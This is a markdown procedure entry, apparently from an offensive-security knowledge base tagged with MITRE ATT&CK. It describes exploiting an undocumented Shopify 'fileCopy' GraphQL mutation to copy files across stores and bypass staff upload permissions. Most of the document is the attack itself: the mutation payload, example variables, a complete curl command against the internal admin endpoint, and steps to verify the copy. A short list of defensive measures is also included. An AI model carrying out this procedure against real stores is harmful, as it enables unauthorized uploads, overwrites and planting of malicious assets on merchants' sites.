---
tags:
  - shopify
  - graphql
  - access-control
  - file-copy
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/shopify-filecopy-mutation-for-file-copy]]'
platforms:
  - Web
  - Cloud
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 0a9f832c-1f03-459b-a445-649eac0b0432
created_at: '2025-12-14T17:32:48.517Z'
updated_at: '2025-12-14T17:32:48.517Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Copy-File-from-Controlled-Store-to-Target-Using-fileCopy

## Summary

This procedure exploits the undocumented 'fileCopy' GraphQL mutation to copy files from an attacker-controlled store to a target store, bypassing staff upload permission restrictions.

## Description

The fileCopy mutation at /admin/internal/web/graphql/core lacks cross-store validation, allowing authenticated staff on storeA to reference files from storeB. This enables unauthorized uploads or overwrites, potentially introducing malicious assets. Requires prior file details from the source store.

## Requirements

1. Authenticated session on target store (from login procedure)
2. File details (absoluteKey, key, path) from controlled store
3. API access token from staff session

## Defense

Defensive measures and detection strategies:

- Document and secure internal APIs with proper permission checks
- Validate source file ownership in mutations
- Audit GraphQL queries for undocumented endpoints

## Objectives

1. Achieve unauthorized file upload to restricted store
2. Demonstrate access control bypass
3. Potentially overwrite existing files

## Instructions

### Step 1: Prepare Mutation Payload

**Context**: Construct the GraphQL query with file details.

Define query: 'mutation fileCopy ($key:String!,$absoluteKey:String!,$path:String!){fileCopy (key:$key,path:$path,absoluteKey:$absoluteKey) {file{path} userErrors {field message}}}'

Variables: {"absoluteKey":"s/files/1/d/0864/0471/6006/6199/files/1.jpg","key":"files/1.jpg","path":"https://cdn.shopify.com/s/files/1/0471/6006/6199/files/1.jpg?6"}

> Expected: Valid JSON payload ready.

### Step 2: Send POST Request

**Context**: Execute the mutation via API.

**Command** ([[commands/shopify-filecopy-mutation-for-file-copy]]):
```bash
curl -X POST 'https://storeA.myshopify.com/admin/internal/web/graphql/core' \
  -H 'Content-Type: application/json' \
  -H 'X-Shopify-Access-Token: YOUR_STAFF_TOKEN' \
  -d '{"query":"mutation fileCopy ($key:String!,$absoluteKey:String!,$path:String!){fileCopy (key:$key,path:$path,absoluteKey:$absoluteKey) {file{path} userErrors {field message}}}","variables":{"absoluteKey":"s/files/1/d/0864/0471/6006/6199/files/1.jpg","key":"files/1.jpg","path":"https://cdn.shopify.com/s/files/1/0471/6006/6199/files/1.jpg?6"}}'
```

> Response includes 'file.path' with copied location; check for userErrors.

### Step 3: Verify Copy

**Context**: Confirm file in target store.

Check Settings > Files in storeA admin.

> Expected: Copied file visible.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/shopify-filecopy-mutation-for-file-copy]]

## Tools Used


## Tags

- [[shopify]]
- [[graphql]]
